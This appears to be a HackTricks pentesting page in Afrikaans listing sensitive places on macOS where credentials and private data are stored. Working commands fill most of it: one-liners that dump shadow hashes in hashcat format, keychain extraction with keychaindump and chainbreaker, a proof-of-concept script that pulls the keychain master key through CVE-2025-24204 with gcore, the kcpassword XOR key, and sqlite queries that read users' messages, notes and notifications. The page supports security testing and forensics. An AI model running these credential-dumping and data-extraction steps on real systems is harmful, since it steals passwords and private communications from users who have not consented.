# macOS Sensitiewe liggings en interessante daemons

{{#include ../../../banners/hacktricks-training.md}}

## Wagwoorde

### Shadow Passwords

Shadow password word saam met die gebruiker se konfigurasie gestoor in plists wat in **`/var/db/dslocal/nodes/Default/users/`** geleë is.\
Die volgende oneliner kan gebruik word om **al die inligting oor die gebruikers te dump** (insluitend hash-info):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) of [**this one**](https://github.com/octomagon/davegrohl.git) kan gebruik word om die hash na **hashcat** **format** te transformeer.

'n Alternatiewe one-liner wat creds van alle nie-service accounts in hashcat format `-m 7100` sal dump (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Nog 'n manier om die `ShadowHashData` van 'n gebruiker te verkry, is deur `dscl` te gebruik: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Hierdie lêer word **slegs gebruik** wanneer die stelsel-ID in **single-user mode** loop (dus nie baie gereeld nie).

### Keychain Dump

Let daarop dat wanneer die security-binary gebruik word om die **gedeëkripteerde passwords** te **dump**, verskeie prompts die gebruiker sal vra om hierdie operasie toe te laat.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Op moderne macOS is die interessantste agterliggende stoorplekke gewoonlik **`~/Library/Keychains/login.keychain-db`** en **`/Library/Keychains/System.keychain`**. Hulle is SQLite-gesteunde lêers, maar plaintext-toegang word steeds deur **`securityd`** bemiddel: diefstal van die rou DB gee jou hoofsaaklik metadata en geënkripteerde blobs, tensy jy ook die gebruiker se wagwoord, `SystemKey` of 'n master key in die geheue herstel.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Gebaseer op hierdie kommentaar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) lyk dit asof hierdie tools nie meer in Big Sur werk nie.

### Keychaindump-oorsig

'n Tool genaamd **keychaindump** is ontwikkel om wagwoorde uit macOS-keychains te onttrek, maar dit het beperkings op nuwer macOS-weergawes soos Big Sur, soos in 'n [bespreking](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) aangedui word. Die gebruik van **keychaindump** vereis dat die aanvaller toegang verkry en privileges na **root** eskaleer. Die tool buit die feit uit dat die keychain gerieflikheidshalwe by verstek ontsluit word wanneer die gebruiker aanmeld, sodat toepassings toegang daartoe kan verkry sonder om die gebruiker se wagwoord herhaaldelik te vereis. As 'n gebruiker egter kies om sy of haar keychain ná elke gebruik te sluit, word **keychaindump** ondoeltreffend.

**Keychaindump** werk deur 'n spesifieke proses genaamd **securityd** te teiken, wat Apple beskryf as 'n daemon vir magtigings- en kriptografiese bewerkings wat noodsaaklik is vir toegang tot die keychain. Die onttrekkingsproses behels die identifisering van 'n **Master Key** wat van die gebruiker se aanmeldwagwoord afgelei word. Hierdie sleutel is noodsaaklik om die keychain-lêer te lees. Om die **Master Key** op te spoor, skandeer **keychaindump** die geheue-heap van **securityd** met behulp van die `vmmap`-opdrag en soek dit na moontlike sleutels binne areas wat as `MALLOC_TINY` gemerk is. Die volgende opdrag word gebruik om hierdie geheue-liggings te inspekteer:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nadat potensiële master keys geïdentifiseer is, soek **keychaindump** deur die heaps na ’n spesifieke patroon (`0x0000000000000018`) wat ’n kandidaat vir die master key aandui. Verdere stappe, insluitend deobfuscation, word benodig om hierdie key te gebruik, soos in die bronkode van **keychaindump** uiteengesit. Analysts wat op hierdie area fokus, moet daarop let dat die kritieke data vir die dekripsie van die keychain binne die geheue van die **securityd**-proses gestoor word. ’n Voorbeeldopdrag om **keychaindump** uit te voer, is:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kan gebruik word om die volgende tipes inligting op ’n forensies verantwoordbare wyse uit ’n OSX-keychain te onttrek:

- Gehashte Keychain-wagwoord, geskik om met [hashcat](https://hashcat.net/hashcat/) of [John the Ripper](https://www.openwall.com/john/) te crack
- Internet-wagwoorde
- Generiese wagwoorde
- Private sleutels
- Publieke sleutels
- X509-sertifikate
- Secure Notes
- Appleshare-wagwoorde

Gegewe die Keychain-ontsluitwagwoord, ’n master key wat met [volafox](https://github.com/n0fate/volafox) of [volatility](https://github.com/volatilityfoundation/volatility) verkry is, of ’n unlock file soos SystemKey, sal Chainbreaker ook plaintext-wagwoorde verskaf.

Sonder een van hierdie metodes om die Keychain te ontsluit, sal Chainbreaker alle ander beskikbare inligting vertoon.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain-sleutels (met wagwoorde) met SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (met wagwoorde) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain-sleutels (met wagwoorde) met memory dump**

[Volg hierdie stappe](../index.html#dumping-memory-with-osxpmem) om ’n **memory dump** uit te voer
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

As jy die gebruiker se wagwoord ken, kan jy dit gebruik om **keychains wat aan die gebruiker behoort te dump en te dekripteer**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain-master-sleutel via `gcore`-entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) is vrygestel met `/usr/bin/gcore` wat die **`com.apple.system-task-ports.read`**-entitlement bevat het, sodat enige plaaslike admin (of kwaadwillige signed app) enige prosesgeheue kon dump, selfs wanneer SIP/TCC afgedwing word. Deur `securityd` te dump, word die **Keychain-master-sleutel** in clear uitgelek en kan jy `login.keychain-db` sonder die gebruiker se wagwoord decrypt.<sup>[[1]](#references)</sup>

**Vinnige repro op kwesbare builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Voer die onttrekte hex-sleutel aan Chainbreaker (`--key <hex>`) om die login keychain te decrypt. Apple het die entitlement in **macOS 15.3+** verwyder, dus werk dit slegs op ongepatchte Sequoia-builds of stelsels wat die kwesbare binary behou het.

### kcpassword

Die **kcpassword**-lêer is 'n lêer wat die **gebruiker se login-wagwoord** bevat, maar slegs indien die stelseleienaar **outomatiese login** geaktiveer het. Die gebruiker sal dus outomaties aangemeld word sonder om vir 'n wagwoord gevra te word (wat nie baie veilig is nie).

Die wagwoord word in die lêer **`/etc/kcpassword`** gestoor, xored met die sleutel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. As die gebruiker se wagwoord langer as die sleutel is, sal die sleutel hergebruik word.\
Dit maak die wagwoord redelik maklik om te recover, byvoorbeeld deur scripts soos [**hierdie een**](https://gist.github.com/opshope/32f65875d45215c3677d) te gebruik.

## Interessante inligting in databasisse

### Boodskappe
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Kennisgewings

Voor **Sequoia** kan jy die Notification Center-store gewoonlik in **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** vind. In **Sequoia+** het Apple dit na die TCC-beskermde groepcontainer **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** verskuif.

Die meeste van die interessante inligting word binne **blob**-kolomme gestoor, dus sal jy daardie inhoud moet onttrek en dit in iets leesbaars vir mense omskep (`plutil -p -`, `strings`, of ’n klein parser). Vinnige triage-voorbeelde:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Onlangse privaatheidskwessies (NotificationCenter DB)

- In macOS **14.7–15.1** het Apple banierinhoud in die `db2/db` SQLite gestoor sonder behoorlike redaksie. CVEs **CVE-2024-44292/44293/40838/54504** het enige plaaslike gebruiker toegelaat om ander gebruikers se kennisgewingteks te lees bloot deur die DB oop te maak (geen TCC-prompt nie).<sup>[[3]](#references)</sup>
- Apple het dit versag deur die DB na `group.com.apple.usernoted` te verskuif en dit met TCC op nuwer Sequoia-builds te beskerm. Op huidige stelsels het jy dus gewoonlik die regte gebruikerskonteks of ’n TCC bypass nodig om dit te lees.<sup>[[4]](#references)</sup>
- Op legacy endpoints, kopieer die `db`, `db-wal` en `db-shm`-lêers saam voordat jy opdateer of herlaai as jy die artefakte wil behou.

### Notas

Die gebruikers se **notas** kan gevind word in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
As die eenreël-opdrag hierbo te raserig is, exporteer `ZICNOTEDATA.ZDATA`, gunzip dit en parse die protobuf: dit is gewoonlik meer betroubaar as om `strings` direk op die SQLite uit te voer.

### Agtergrondtake / Aanmelditems

Sedert **Ventura** word gebruikergoedgekeurde aanmelditems en verskeie agtergrondtake in **BTM**-stores nagespoor, soos **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** en die weergawegebaseerde stelselkas **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Hierdie lêers is nuttig om vinnig persistence, helper tools en sommige MDM-bestuurde agtergronditems te identifiseer:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Vir die persistence-perspektief en BTM-internals, raadpleeg [die auto-start locations-bladsy](../../macos-auto-start-locations.md#login-items) en [die Background Tasks Management-notas](../macos-security-protections/README.md#background-tasks-management).

## Voorkeure

In macOS is app-voorkeure in **`$HOME/Library/Preferences`** geleë, en in iOS is dit in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS kan die CLI-tool **`defaults`** gebruik word om die **Preferences-lêer te wysig**.

**`/usr/sbin/cfprefsd`** maak aanspraak op die XPC-dienste `com.apple.cfprefsd.daemon` en `com.apple.cfprefsd.agent` en kan geroep word om aksies soos die wysiging van voorkeure uit te voer.

## OpenDirectory permissions.plist

Die lêer `/System/Library/OpenDirectory/permissions.plist` bevat toestemmings wat op node-attribuut toegepas word en word deur SIP beskerm.\
Hierdie lêer verleen toestemmings aan spesifieke gebruikers volgens UUID (en nie uid nie), sodat hulle toegang tot spesifieke sensitiewe inligting soos `ShadowHashData`, `HeimdalSRPKey` en `KerberosKeys`, onder andere, kan verkry:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Stelselkennisgewings

### Darwin-kennisgewings

Die hoof-`daemon` vir kennisgewings is **`/usr/sbin/notifyd`**. Om kennisgewings te ontvang, moet clients deur die `com.apple.system.notification_center` Mach-port registreer (kontroleer hulle met `sudo lsmp -p <pid notifyd>`). Die `daemon` is konfigureerbaar met die lêer `/etc/notify.conf`.

Die name wat vir kennisgewings gebruik word, is unieke reverse DNS-notasies, en wanneer ’n kennisgewing na een van hulle gestuur word, sal die client(s) wat aangedui het dat hulle dit kan hanteer, dit ontvang.

Dit is moontlik om die huidige status te dump (en al die name te sien) deur die sein SIGUSR2 na die notifyd-proses te stuur en die gegenereerde lêer te lees: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Die **Distributed Notification Center**, waarvan die hoofbinary **`/usr/sbin/distnoted`** is, is nog ’n manier om notifications te stuur. Dit stel sommige XPC services bloot en voer sekere kontroles uit om kliënte te probeer verifieer.

### Apple Push Notifications (APN)

In hierdie geval kan applications vir **topics** registreer. Die kliënt sal ’n token genereer deur met Apple se servers te kommunikeer via **`apsd`**.\
Dan sal providers ook ’n token gegenereer het en met Apple se servers kan connect om messages aan die kliënte te stuur. Hierdie messages sal plaaslik deur **`apsd`** ontvang word, wat die notification sal relay na die application wat daarvoor wag.

Die preferences is geleë in `/Library/Preferences/com.apple.apsd.plist`.

Daar is ’n plaaslike database van messages wat in macOS geleë is in `/Library/Application\ Support/ApplePushService/aps.db` en in iOS in `/var/mobile/Library/ApplePushService`. Dit het 3 tabelle: `incoming_messages`, `outgoing_messages` en `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Dit is ook moontlik om inligting oor die daemon en verbindings te verkry deur:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Gebruikerskennisgewings

Dit is kennisgewings wat die gebruiker op die skerm behoort te sien:

- **`CFUserNotification`**: Hierdie API's bied 'n manier om 'n pop-up met 'n boodskap op die skerm te vertoon.
- **The Bulletin Board**: Dit vertoon 'n banier in iOS wat verdwyn en in die Notification Center gestoor word.
- **`NSUserNotificationCenter`**: Dit is die iOS bulletin board in MacOS. In ouer macOS-vrystellings is die databasis gewoonlik geleë in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; op Sequoia+ is dit geskuif na `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Verwysings

- [1] [HelpNetSecurity – macOS gcore entitlement het Keychain master key-ekstraksie toegelaat (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain-data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – SQLite-disclosure in Notification Center (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple spreek privaatheidskwessies rondom die Notification Center-databasis in macOS Sequoia aan](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
